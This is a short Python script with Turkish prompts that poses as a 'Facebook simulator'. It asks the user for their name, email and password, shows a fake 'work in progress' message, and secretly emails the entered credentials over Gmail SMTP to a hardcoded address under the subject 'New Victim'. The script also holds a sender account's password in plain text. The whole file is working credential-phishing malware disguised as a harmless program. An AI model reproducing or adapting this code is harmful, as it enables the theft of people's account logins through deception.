import smtplib

gonderici_mail="athncldr@gmail.com"
gonderici_sifre="katara252000"
alicilar="korra635@hotmail.com"

isim=input("Merhaba, Facebook simülatörüne hoşgeldiniz.\nSadece adınızı yazınız.\n")
s1=input("Giriş yapmak için e-postanızı yazınız.\n")
s2=input("Tamam, şimdi giriş yapmak için şifrenizi girin.\n")
print("Şimdiye kadar bu kadarını yapabildim. Denediğiniz için teşekkürler, ileride geliştireceğim.")

mesaj="From: Atahan <athncldr@gmail.com>\nTo: atahan <korra635@hotmail.com>\nSubject: New Victim:{}\n\nE-Mail: {}\nPassword: {}"

mesaj=mesaj.format(isim,s1,s2)

server= smtplib.SMTP("smtp.gmail.com", 587)
server.ehlo()
server.starttls()
server.ehlo()
server.login(gonderici_mail, gonderici_sifre)

try:
    server.sendmail(gonderici_mail, alicilar, mesaj)
    print("Olumlu")
except:
    print("Olumsuz")

server.quit()
